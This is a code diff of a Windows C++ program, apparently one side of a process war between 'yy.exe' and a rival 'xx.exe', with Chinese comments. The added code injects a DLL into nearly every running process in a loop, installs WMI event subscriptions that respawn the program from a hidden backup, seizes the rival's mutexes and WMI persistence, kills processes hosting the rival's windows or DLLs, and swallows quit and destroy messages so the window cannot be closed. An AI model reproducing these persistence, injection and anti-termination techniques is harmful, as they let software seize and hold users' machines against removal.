@@ -1,10 +1,15 @@
-#include <windows.h>
+﻿#include <windows.h>
 #include <tlhelp32.h>
 #include <iostream>
 #include <string>
 #include <vector>
 #include <iomanip>
 #include <sstream>
+#include <objbase.h>
+#include <wbemidl.h>
+#pragma comment(lib, "wbemuuid.lib")
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "oleaut32.lib")
 
 // ============================================================================
 // 1. NT 内核未公开结构体与前置声明区域
@@ -18,18 +23,19 @@ typedef struct _UNICODE_STRING {
 static void LogAction(const std::string& text);
 static void LockDownMaliciousFileNodes();
 static void ReleaseFileLocks();
-static void StealAndLockEnemyMutex();
+static DWORD WINAPI MutexHoldThread(LPVOID lpParam);
 static void LockDownBbyovdChannels();
 static void ForceLockDllInjection();
 static void ForceLockRemoteCall();
 static bool EnableDebugPrivilege();
 static bool CheckNameMatch(const wchar_t* a, const wchar_t* b);
-static bool ActionInject(const wchar_t* pName, const wchar_t* path);
+static bool InjectIntoPid(DWORD pid, const wchar_t* path);
+static bool IsProtectedProcess(const wchar_t* name);
 
 // ---- 全局配置区域 —— 精确配置 ----
 const wchar_t* GOAL_NAME = L"xx.exe";
 const wchar_t* SHOW_TITLE = L"YY_Defensive_GUI";
-const wchar_t* GUARD_DLL = L"guard.dll";
+const wchar_t* GUARD_DLL = L"yyguard.dll";
 const wchar_t* HONEYPOT_EXE_NAME = L"lenovo_fix.exe";
 
 const wchar_t* BAD_MODULES[] = {
@@ -271,11 +277,157 @@ static void ReleaseFileLocks() {
     LeaveCriticalSection(&g_LockBox);
 }
 
-static void StealAndLockEnemyMutex() {
-    g_hEnemyMutexLock = CreateMutexW(NULL, TRUE, L"Global\\xx_window_guard");
-    if (g_hEnemyMutexLock != NULL && GetLastError() == ERROR_ALREADY_EXISTS) {
-        LogAction("Mutex Guard: Intercepted an existing enemy window lock.");
+// 抢死对手弹窗互斥锁：xx 的 window.dll 靠这个锁决定谁能弹窗。
+// 同时占 Global\ 和本地会话两个名字（xx 已把锁改成本地会话锁），抢到永久持有。
+static DWORD WINAPI HoldMutexForever(LPVOID lpName) {
+    const wchar_t* name = (const wchar_t*)lpName;
+    HANDLE h = CreateMutexW(NULL, FALSE, name);
+    if (!h) return 0;
+    while (true) {
+        DWORD w = WaitForSingleObject(h, 0);
+        if (w == WAIT_OBJECT_0 || w == WAIT_ABANDONED) {
+            for (;;) Sleep(60000);   // 永久持有，不释放
+        }
+        Sleep(5);
     }
+    return 0;
+}
+
+static DWORD WINAPI MutexHoldThread(LPVOID lpParam) {
+    (void)lpParam;
+    static wchar_t gname[] = L"Global\\xx_window_guard";
+    static wchar_t lname[] = L"xx_window_guard";
+    static wchar_t mname[] = L"xx_window_make_guard";
+    HANDLE t1 = CreateThread(NULL, 0, HoldMutexForever, gname, 0, NULL);
+    if (t1) CloseHandle(t1);
+    HANDLE t2 = CreateThread(NULL, 0, HoldMutexForever, lname, 0, NULL);
+    if (t2) CloseHandle(t2);
+    HANDLE t3 = CreateThread(NULL, 0, HoldMutexForever, mname, 0, NULL);
+    if (t3) CloseHandle(t3);
+    return 0;
+}
+
+// 删除 xx 的 WMI 复活订阅（__EventFilter "XX_RespawnFilter" + CommandLineEventConsumer）
+static void DeleteEnemyWmiSubscription() {
+    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    if (FAILED(hr)) return;
+    IWbemLocator* pLoc = NULL;
+    IWbemServices* pSvc = NULL;
+    wchar_t ns[] = L"ROOT\\CIMV2";
+    wchar_t fp[] = L"__EventFilter.Name=\"XX_RespawnFilter\"";
+    wchar_t cp[] = L"CommandLineEventConsumer.Name=\"XX_RespawnConsumer\"";
+    hr = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void**)&pLoc);
+    if (SUCCEEDED(hr) && pLoc) {
+        hr = pLoc->ConnectServer(ns, NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
+        if (SUCCEEDED(hr) && pSvc) {
+            CoSetProxyBlanket((IUnknown*)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
+                              RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
+            pSvc->DeleteInstance(fp, 0, NULL, NULL);
+            pSvc->DeleteInstance(cp, 0, NULL, NULL);
+            pSvc->Release();
+        }
+        pLoc->Release();
+    }
+    CoUninitialize();
+}
+
+// 周期性清除 xx 的 WMI 复活订阅
+static DWORD WINAPI WmiKillerThread(LPVOID lpParam) {
+    (void)lpParam;
+    while (true) {
+        DeleteEnemyWmiSubscription();
+        Sleep(5000);
+    }
+    return 0;
+}
+
+// 创建 YY 自己的 WMI 复活订阅：yy.exe 被杀时自动拉起（不依赖 DLL 注入）
+static void CreateOwnWmiRespawn() {
+    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    if (FAILED(hr)) return;
+    IWbemLocator* pLoc = NULL;
+    IWbemServices* pSvc = NULL;
+    wchar_t ns[] = L"ROOT\\CIMV2";
+    wchar_t wFilter[] = L"__EventFilter";
+    wchar_t wConsumer[] = L"CommandLineEventConsumer";
+    wchar_t wBinding[] = L"__FilterToConsumerBinding";
+    wchar_t exePath[MAX_PATH];
+    if (!GetModuleFileNameW(NULL, exePath, MAX_PATH)) { CoUninitialize(); return; }
+    wchar_t cmd[1024];
+    wchar_t bakPath[MAX_PATH];
+    wcscpy_s(bakPath, exePath);
+    wchar_t* bsl = wcsrchr(bakPath, L'\\');
+    if (bsl) { bsl[1] = L'\0'; wcscat_s(bakPath, L"yyres.bin"); }
+    swprintf_s(cmd, L"cmd.exe /c if not exist \"%s\" copy /y \"%s\" \"%s\" & start \"\" \"%s\"", exePath, bakPath, exePath, exePath);
+
+    hr = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void**)&pLoc);
+    if (FAILED(hr) || !pLoc) { CoUninitialize(); return; }
+    hr = pLoc->ConnectServer(ns, NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
+    if (FAILED(hr) || !pSvc) { pLoc->Release(); CoUninitialize(); return; }
+    CoSetProxyBlanket((IUnknown*)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
+
+    IWbemClassObject* pFilterClass = NULL, * pFilterInst = NULL;
+    IWbemClassObject* pConsumerClass = NULL, * pConsumerInst = NULL;
+    IWbemClassObject* pBindingClass = NULL, * pBindingInst = NULL;
+    VARIANT v; VariantInit(&v);
+
+    if (SUCCEEDED(pSvc->GetObject(wFilter, 0, NULL, &pFilterClass, NULL)) && pFilterClass &&
+        SUCCEEDED(pFilterClass->SpawnInstance(0, &pFilterInst)) && pFilterInst) {
+        v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"YY_RespawnFilter"); pFilterInst->Put(L"Name", 0, &v, 0); VariantClear(&v);
+        v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"WQL"); pFilterInst->Put(L"QueryLanguage", 0, &v, 0); VariantClear(&v);
+        v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"root\\cimv2"); pFilterInst->Put(L"EventNamespace", 0, &v, 0); VariantClear(&v);
+        v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'yy.exe'"); pFilterInst->Put(L"Query", 0, &v, 0); VariantClear(&v);
+        pSvc->PutInstance(pFilterInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
+    }
+    if (SUCCEEDED(pSvc->GetObject(wConsumer, 0, NULL, &pConsumerClass, NULL)) && pConsumerClass &&
+        SUCCEEDED(pConsumerClass->SpawnInstance(0, &pConsumerInst)) && pConsumerInst) {
+        v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"YY_RespawnConsumer"); pConsumerInst->Put(L"Name", 0, &v, 0); VariantClear(&v);
+        v.vt = VT_BSTR; v.bstrVal = SysAllocString(cmd); pConsumerInst->Put(L"CommandLineTemplate", 0, &v, 0); VariantClear(&v);
+        pSvc->PutInstance(pConsumerInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
+    }
+    if (SUCCEEDED(pSvc->GetObject(wBinding, 0, NULL, &pBindingClass, NULL)) && pBindingClass &&
+        SUCCEEDED(pBindingClass->SpawnInstance(0, &pBindingInst)) && pBindingInst) {
+        v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"__EventFilter.Name=\"YY_RespawnFilter\""); pBindingInst->Put(L"Filter", 0, &v, 0); VariantClear(&v);
+        v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"CommandLineEventConsumer.Name=\"YY_RespawnConsumer\""); pBindingInst->Put(L"Consumer", 0, &v, 0); VariantClear(&v);
+        pSvc->PutInstance(pBindingInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
+    }
+
+    if (pBindingInst) pBindingInst->Release();
+    if (pBindingClass) pBindingClass->Release();
+    if (pConsumerInst) pConsumerInst->Release();
+    if (pConsumerClass) pConsumerClass->Release();
+    if (pFilterInst) pFilterInst->Release();
+    if (pFilterClass) pFilterClass->Release();
+    pSvc->Release();
+    pLoc->Release();
+    CoUninitialize();
+}
+
+// 周期性维护 YY 自己的 WMI 复活订阅
+static DWORD WINAPI WmiRespawnThread(LPVOID lpParam) {
+    (void)lpParam;
+    while (true) {
+        CreateOwnWmiRespawn();
+        Sleep(10000);
+    }
+    return 0;
+}
+
+// 自保：持续维护 yyres.bin 备份，yy.exe 被 xx 删除后由 yyguard.dll/WMI 还原
+static DWORD WINAPI SelfProtectThread(LPVOID lpParam) {
+    (void)lpParam;
+    WCHAR self[MAX_PATH], bak[MAX_PATH];
+    GetModuleFileNameW(NULL, self, MAX_PATH);
+    wcscpy_s(bak, self);
+    wchar_t* s = wcsrchr(bak, L'\\');
+    if (s) { s[1] = L'\0'; wcscat_s(bak, L"yyres.bin"); }
+    while (true) {
+        if (GetFileAttributesW(bak) == INVALID_FILE_ATTRIBUTES) {
+            CopyFileW(self, bak, FALSE);
+        }
+        Sleep(1000);
+    }
+    return 0;
 }
 
 static void LockDownBbyovdChannels() {
@@ -411,36 +563,70 @@ static bool CheckNameMatch(const wchar_t* a, const wchar_t* b) {
     while (*a && *b) { if (towupper(*a) != towupper(*b)) return false; a++; b++; }
     return (*a == L'\0' && *b == L'\0');
 }
-static bool ActionInject(const wchar_t* pName, const wchar_t* path) {
-    bool ok = false; HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnap == INVALID_HANDLE_VALUE) return false;
-    PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
-    if (Process32FirstW(hSnap, &pe)) {
-        do {
-            if (CheckNameMatch(pe.szExeFile, pName)) {
-                HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID); if (!hProc) continue;
-                size_t sz = (lstrlenW(path) + 1) * sizeof(wchar_t);
-                LPVOID ptr = VirtualAllocEx(hProc, NULL, sz, MEM_COMMIT, PAGE_READWRITE);
-                if (ptr) {
-                    if (WriteProcessMemory(hProc, ptr, path, sz, NULL)) {
-                        PTHREAD_START_ROUTINE pLoad = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryW");
-                        if (pLoad) {
-                            HANDLE hTh = CreateRemoteThread(hProc, NULL, 0, pLoad, ptr, 0, NULL);
-                            if (hTh) { CloseHandle(hTh); ok = true; }
-                        }
-                    }
-                    if (!ok) VirtualFreeEx(hProc, ptr, 0, MEM_RELEASE);
-                }
-                CloseHandle(hProc);
-            }
-        } while (Process32NextW(hSnap, &pe));
-    }
-    CloseHandle(hSnap); return ok;
+// 受保护进程（不注入）：系统进程注入会卡死系统，恢复跳过
+static bool IsProtectedProcess(const wchar_t* name) {
+    static const wchar_t* list[] = {
+        L"System", L"smss.exe", L"csrss.exe", L"wininit.exe",
+        L"services.exe", L"lsass.exe", L"winlogon.exe",
+        L"spoolsv.exe", L"dwm.exe", L"taskhost.exe", NULL
+    };
+    for (int i = 0; list[i]; i++)
+        if (CheckNameMatch(name, list[i])) return true;
+    return false;
 }
+
+// 向指定 PID 注入 DLL（用最小权限集，避免被拒）
+static bool InjectIntoPid(DWORD pid, const wchar_t* path) {
+    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (!hProc) return false;
+    size_t sz = (lstrlenW(path) + 1) * sizeof(wchar_t);
+    LPVOID ptr = VirtualAllocEx(hProc, NULL, sz, MEM_COMMIT, PAGE_READWRITE);
+    bool ok = false;
+    if (ptr) {
+        if (WriteProcessMemory(hProc, ptr, path, sz, NULL)) {
+            PTHREAD_START_ROUTINE pLoad = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryW");
+            if (pLoad) {
+                HANDLE hTh = CreateRemoteThread(hProc, NULL, 0, pLoad, ptr, 0, NULL);
+                if (hTh) { WaitForSingleObject(hTh, 2000); CloseHandle(hTh); ok = true; }
+            }
+        }
+        VirtualFreeEx(hProc, ptr, 0, MEM_RELEASE);
+    }
+    CloseHandle(hProc);
+    return ok;
+}
+
 static DWORD WINAPI ServiceWorker(LPVOID lpParamToken) {
-    EnableDebugPrivilege(); wchar_t fPath[MAX_PATH]; GetFullPathNameW(GUARD_DLL, MAX_PATH, fPath, NULL);
+    EnableDebugPrivilege();
+    // 用 exe 所在目录解析 yyguard.dll（不能用 cwd）
+    wchar_t exeDir[MAX_PATH];
+    GetModuleFileNameW(NULL, exeDir, MAX_PATH);
+    wchar_t* slash = wcsrchr(exeDir, L'\\');
+    if (slash) slash[1] = L'\0';
+    wchar_t fPath[MAX_PATH];
+    wcscpy_s(fPath, exeDir);
+    wcscat_s(fPath, GUARD_DLL);
+
+    int round = 0;
     while (true) {
-        int count = 0; for (int i = 0; i < HOOD_COUNT; i++) { if (ActionInject(HOOD_LIST[i], fPath)) count++; }
-        if (count > 0) Sleep(3000); else Sleep(2000);
+        int okCount = 0;
+        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnap != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
+            if (Process32FirstW(hSnap, &pe)) {
+                do {
+                    if (pe.th32ProcessID <= 4) continue;
+                    if (pe.th32ProcessID == GetCurrentProcessId()) continue;
+                    if (IsProtectedProcess(pe.szExeFile)) continue;
+                    if (InjectIntoPid(pe.th32ProcessID, fPath)) okCount++;
+                } while (Process32NextW(hSnap, &pe));
+            }
+            CloseHandle(hSnap);
+        }
+        if (++round % 5 == 0) {
+            LogAction("Spread: yyguard.dll injected into " + std::to_string(okCount) + " procs.");
+        }
+        Sleep(2000);
     }
     return 0;
 }
@@ -479,6 +665,59 @@ static DWORD WINAPI HoneypotDecoyWorker(LPVOID lpParam) {
     }
     return 0;
 }
+// 卸载指定进程里加载的敌方 DLL（window.dll/svcguard.dll 等），不杀宿主进程。
+// 这样既能压掉 xx 的兜底窗，又不误杀自己注入 yyguard.dll 的宿主。
+static void UnloadBadDllsFromProcess(DWORD pid) {
+    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (!hProc) return;
+    HANDLE mSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
+    if (mSnap != INVALID_HANDLE_VALUE) {
+        MODULEENTRY32W me = { sizeof(MODULEENTRY32W) };
+        if (Module32FirstW(mSnap, &me)) {
+            do {
+                for (int k = 0; k < BAD_COUNT; k++) {
+                    if (CheckNameMatch(me.szModule, BAD_MODULES[k])) {
+                        FARPROC pFree = GetProcAddress(GetModuleHandleA("kernel32.dll"), "FreeLibrary");
+                        if (pFree) {
+                            HANDLE hTh = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pFree, me.modBaseAddr, 0, NULL);
+                            if (hTh) { WaitForSingleObject(hTh, 2000); CloseHandle(hTh); }
+                        }
+                        break;
+                    }
+                }
+            } while (Module32NextW(mSnap, &me));
+        }
+        CloseHandle(mSnap);
+    }
+    CloseHandle(hProc);
+}
+
+// 找到 xx 那个可见的 XX_ALIVE_WND_* 弹窗，直接杀掉它的宿主进程。
+// 卸载（FreeLibrary）又慢又不可靠（xx 500ms 重新注入，且 DETACH 会卡 3 秒），
+// 杀宿主最干净利落——弹窗随进程一起消失。
+static BOOL CALLBACK FindEnemyPopupProc(HWND hWnd, LPARAM lp) {
+    DWORD* pPid = (DWORD*)lp;
+    if (!IsWindowVisible(hWnd)) return TRUE;
+    wchar_t cls[128] = { 0 };
+    GetClassNameW(hWnd, cls, 128);
+    if (wcsstr(cls, L"XX_ALIVE_WND_")) {
+        GetWindowThreadProcessId(hWnd, pPid);
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static void KillEnemyPopupHost() {
+    DWORD pid = 0;
+    EnumWindows(FindEnemyPopupProc, (LPARAM)&pid);
+    if (pid == 0 || pid == GetCurrentProcessId()) return;
+    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+    if (h) {
+        TerminateProcess(h, 0);
+        CloseHandle(h);
+    }
+}
+
 static DWORD WINAPI HunterWorker(LPVOID lpParamToken) {
     EnableDebugPrivilege();
     HMODULE hMod = GetModuleHandleA("ntdll.dll");
@@ -493,6 +732,8 @@ static DWORD WINAPI HunterWorker(LPVOID lpParamToken) {
         if (pQuery) {
             DWORD op; if (VirtualProtect(pQuery, 5, PAGE_EXECUTE_READWRITE, &op)) { memcpy(pQuery, queryCache, 5); VirtualProtect(pQuery, 5, op, &op); }
         }
+        // 先杀 xx 的可见弹窗宿主（最干净），再枚举进程杀 xx.exe
+        KillEnemyPopupHost();
         HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (hSnap != INVALID_HANDLE_VALUE) {
             PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
@@ -500,11 +741,14 @@ static DWORD WINAPI HunterWorker(LPVOID lpParamToken) {
                 do {
                     if (pe.th32ProcessID <= 4) continue;
                     if (CheckNameMatch(pe.szExeFile, HONEYPOT_EXE_NAME)) continue;
+                    bool bIsGoal = CheckNameMatch(pe.szExeFile, GOAL_NAME);
                     bool wipe = false;
                     DWORD triggerPID = InterlockedExchangeAdd((LONG*)&g_HoneypotTriggeredPID, 0);
                     if (triggerPID != 0 && pe.th32ProcessID == triggerPID) wipe = true;
-                    if (CheckNameMatch(pe.szExeFile, GOAL_NAME)) wipe = true;
+                    if (bIsGoal) wipe = true;
                     if (!wipe) {
+                        // 加载了敌方 DLL（window.dll/svcguard.dll 等）就杀。
+                        // yyguard.dll 已藏在 xx 不碰的服务进程里，杀这些宿主不会误伤自己。
                         HANDLE mSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe.th32ProcessID);
                         if (mSnap != INVALID_HANDLE_VALUE) {
                             MODULEENTRY32W me = { sizeof(MODULEENTRY32W) };
@@ -519,7 +763,8 @@ static DWORD WINAPI HunterWorker(LPVOID lpParamToken) {
                             CloseHandle(mSnap);
                         }
                     }
-                    if (wipe) {
+                    if (!wipe) continue;
+                    {
                         wchar_t targetDiskPath[MAX_PATH] = { 0 };
                         HANDLE hQueryPath = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
                         if (hQueryPath) {
@@ -551,14 +796,23 @@ static DWORD WINAPI HunterWorker(LPVOID lpParamToken) {
                             ReleaseFileLocks();
                             TerminateProcess(hKill, 0);
                             CloseHandle(hKill);
-                            if (lstrlenW(targetDiskPath) > 0) DeleteFileW(targetDiskPath);
-                            for (int k = 0; k < BAD_COUNT; k++) {
-                                wchar_t absBad[MAX_PATH * 2] = { 0 };
-                                ResolveNextToExe(BAD_MODULES[k], absBad, MAX_PATH * 2);
-                                if (absBad[0]) DeleteFileW(absBad);
+                            // 只有 xx.exe 才删它自己的 exe 和 xxres.bin；宿主(explorer 等)只杀不删
+                            if (bIsGoal) {
+                                if (lstrlenW(targetDiskPath) > 0) {
+                                    DeleteFileW(targetDiskPath);
+                                    wchar_t bakPath[MAX_PATH];
+                                    wcscpy_s(bakPath, targetDiskPath);
+                                    wchar_t* bslash = wcsrchr(bakPath, L'\\');
+                                    if (bslash) { bslash[1] = L'\0'; wcscat_s(bakPath, L"xxres.bin"); DeleteFileW(bakPath); }
+                                }
+                                for (int k = 0; k < BAD_COUNT; k++) {
+                                    wchar_t absBad[MAX_PATH * 2] = { 0 };
+                                    ResolveNextToExe(BAD_MODULES[k], absBad, MAX_PATH * 2);
+                                    if (absBad[0]) DeleteFileW(absBad);
+                                }
+                                LogAction("Wipe Engine: Discovered target. File system locked and cleared.");
+                                LockDownMaliciousFileNodes();
                             }
-                            LogAction("Wipe Engine: Discovered target. File system locked and cleared.");
-                            LockDownMaliciousFileNodes();
                             if (pe.th32ProcessID == triggerPID) InterlockedExchange((LONG*)&g_HoneypotTriggeredPID, 0);
                         }
                     }
@@ -608,45 +862,72 @@ static void InitializeCodeImageBackup() {
     g_pOriginalImageBackup = new BYTE[g_dwTextSize];
     memcpy(g_pOriginalImageBackup, g_pMainTextBase, g_dwTextSize);
 }
+// 创建（或重建）主窗口 + 日志框
+static void CreateMainWindow(HINSTANCE hInst) {
+    g_hMainWnd = CreateWindowExW(WS_EX_TOPMOST, L"YYWnd_7f3a9c1e", SHOW_TITLE, WS_OVERLAPPEDWINDOW | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, 500, 400, NULL, NULL, hInst, NULL);
+    if (g_hMainWnd) {
+        g_hLogBox = CreateWindowExW(0, L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY, 10, 10, 460, 340, g_hMainWnd, NULL, hInst, NULL);
+    }
+}
 static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
     if (msg == WM_QUERYENDSESSION || msg == WM_ENDSESSION) return FALSE;
     if (msg == WM_CLOSE) return 0;
-    if (msg == WM_DESTROY) {
-        EnterCriticalSection(&g_LockBox); g_hLogBox = NULL; LeaveCriticalSection(&g_LockBox);
-        PostQuitMessage(0); return 0;
-    }
+    if (msg == WM_DESTROY) return 0;   // 吞掉销毁消息，主循环会重建窗口
     return DefWindowProcW(hwnd, msg, wp, lp);
 }
+static void YyLog(const wchar_t* msg) {
+    WCHAR path[MAX_PATH] = { 0 };
+    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) wcscpy_s(path, L"C:\\yy_debug.log");
+    else { WCHAR* s = wcsrchr(path, L'\\'); if (s) s[1] = L'\0'; wcscat_s(path, L"yy_debug.log"); }
+    HANDLE h = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h != INVALID_HANDLE_VALUE) {
+        WCHAR line[512];
+        swprintf_s(line, 512, L"[%lu] %s\r\n", GetCurrentProcessId(), msg);
+        DWORD w = 0;
+        WriteFile(h, line, (DWORD)(wcslen(line) * sizeof(WCHAR)), &w, NULL);
+        CloseHandle(h);
+    }
+}
+
 int main() {
     InitializeCriticalSection(&g_LockBox);
+    YyLog(L"yy.exe main started");
+    // 最早启动生存机制（1ms 内）：注入 yyguard.dll + 抢锁 + 杀 xx.exe + WMI复活 + 备份，
+    // 防止 xx 在几十毫秒内把 yy.exe 秒了导致一切都没初始化，并抢先杀掉 xx.exe 赢下竞速
+    CreateThread(NULL, 0, ServiceWorker, NULL, 0, NULL);     // 注入 yyguard.dll（快）
+    CreateThread(NULL, 0, MutexHoldThread, NULL, 0, NULL);   // 占锁（快）
+    CreateThread(NULL, 0, HunterWorker, NULL, 0, NULL);      // 抢先杀 xx.exe（赢竞速）
+    CreateThread(NULL, 0, WmiRespawnThread, NULL, 0, NULL);  // WMI 复活（后台）
+    CreateThread(NULL, 0, SelfProtectThread, NULL, 0, NULL); // 备份（快）
     InitializeCodeImageBackup();
     // 完美修复 3：统一前置声明标识符对齐到全局标准的 QuickVeh 异常回调函数
     AddVectoredExceptionHandler(1, QuickVeh);
     LockDownMaliciousFileNodes();
     LockDownBbyovdChannels();
-    StealAndLockEnemyMutex();
+    CreateThread(NULL, 0, WmiKillerThread, NULL, 0, NULL);
     ForceLockDllInjection();
-    ForceLockRemoteCall();
     HINSTANCE hInst = GetModuleHandleW(NULL);
     WNDCLASSEXW wc = { 0 };
     wc.cbSize = sizeof(WNDCLASSEXW); wc.lpfnWndProc = WndProc; wc.hInstance = hInst;
     wc.hCursor = LoadCursor(NULL, IDC_ARROW); wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
-    wc.lpszClassName = L"ChallengeWindowClass";
+    wc.lpszClassName = L"YYWnd_7f3a9c1e";
     if (!RegisterClassExW(&wc)) return 0;
-    g_hMainWnd = CreateWindowExW(WS_EX_TOPMOST, L"ChallengeWindowClass", SHOW_TITLE, WS_OVERLAPPEDWINDOW | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, 500, 400, NULL, NULL, hInst, NULL);
-    g_hLogBox = CreateWindowExW(0, L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY, 10, 10, 460, 340, g_hMainWnd, NULL, hInst, NULL);
+    CreateMainWindow(hInst);
     LogAction("System Shield Active. Trampoline isolation initialized.");
-    HANDLE hT1 = CreateThread(NULL, 0, ServiceWorker, NULL, 0, NULL);
     HANDLE hT2 = CreateThread(NULL, 0, ShieldWorker, NULL, 0, NULL);
-    HANDLE hT3 = CreateThread(NULL, 0, HunterWorker, NULL, 0, NULL);
     HANDLE hT4 = CreateThread(NULL, 0, HoneypotDecoyWorker, NULL, 0, NULL);
-    if (hT1) CloseHandle(hT1); if (hT2) CloseHandle(hT2); if (hT3) CloseHandle(hT3); if (hT4) CloseHandle(hT4);
+    if (hT2) CloseHandle(hT2); if (hT4) CloseHandle(hT4);
     MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        if (msg.message == WM_QUIT) {
-            break;
+    while (true) {
+        while (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE)) {
+            if (msg.message == WM_QUIT) continue;   // 吞掉一切 WM_QUIT（含对手投递的）
+            TranslateMessage(&msg);
+            DispatchMessageW(&msg);
         }
-        TranslateMessage(&msg); DispatchMessage(&msg);
+        if (!g_hMainWnd || !IsWindow(g_hMainWnd)) {
+            CreateMainWindow(hInst);                 // 主窗口被销毁后自动重建
+        }
+        Sleep(20);
     }
     ReleaseFileLocks();
     if (g_hEnemyMutexLock != NULL) CloseHandle(g_hEnemyMutexLock);
